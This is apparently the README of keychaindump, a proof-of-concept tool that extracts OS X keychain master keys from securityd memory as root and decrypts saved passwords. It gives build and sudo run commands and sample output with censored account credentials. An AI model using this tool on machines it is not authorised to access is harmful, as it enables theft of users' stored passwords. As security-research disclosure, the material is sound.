# keychaindump
Keychaindump is a proof-of-concept tool for reading OS X keychain passwords as root. It hunts for unlocked keychain master keys located in the memory space of the securityd process, and uses them to decrypt keychain files.

See the [blog post](http://juusosalonen.com/post/30923743427/breaking-into-the-os-x-keychain) for a much more readable description.

## How?
Build instructions:

    $ gcc keychaindump.c -o keychaindump -lcrypto

Basic usage:

    $ sudo ./keychaindump [path to keychain file, leave blank for default]

Example with truncated and censored output:

    $ sudo ./keychaindump 
    [*] Searching process 15 heap range 0x7fa809400000-0x7fa809500000
    [*] Searching process 15 heap range 0x7fa809500000-0x7fa809600000
    [*] Searching process 15 heap range 0x7fa809600000-0x7fa809700000
    [*] Searching process 15 heap range 0x7fa80a900000-0x7fa80ac00000
    [*] Found 17 master key candidates
    [*] Trying to decrypt wrapping key in /Users/juusosalonen/Library/Keychains/login.keychain
    [*] Trying master key candidate: b49ad51a672bd4be55a4eb4efdb90b242a5f262ba80a95df
    [*] Trying master key candidate: 22b8aa80fa0700605f53994940fcfe9acc44eb1f4587f1ac
    [*] Trying master key candidate: 1d7aa80fa0700f002005043210074b877579996d09b70000
    [*] Trying master key candidate: 88edbaf22819a8eeb8e9b75120c0775de8a4d7da842d4a4a
    [+] Found master key: 88edbaf22819a8eeb8e9b75120c0775de8a4d7da842d4a4a
    [+] Found wrapping key: e9acc39947f1996df940fceb1f458ac74b877579f54409b7
    xxxxxxx:192.168.1.1:xxxxxxx
    xxxxxxx@gmail.com:login.facebook.com:xxxxxxx
    xxxxxxx@gmail.com:smtp.google.com:xxxxxxx
    xxxxxxx@gmail.com:imap.google.com:xxxxxxx
    xxxxxxx:twitter.com:xxxxxxx
    xxxxxxx@gmail.com:www.google.com:xxxxxxx
    xxxxxxx:imap.gmail.com:xxxxxxx
    ...

## Who?
Keychaindump was written by [Juuso Salonen](http://twitter.com/juusosalonen), the guy behind [Radio Silence](http://radiosilenceapp.com) and [Private Eye](http://radiosilenceapp.com/private-eye).

## License
Do whatever you wish. Please don't be evil.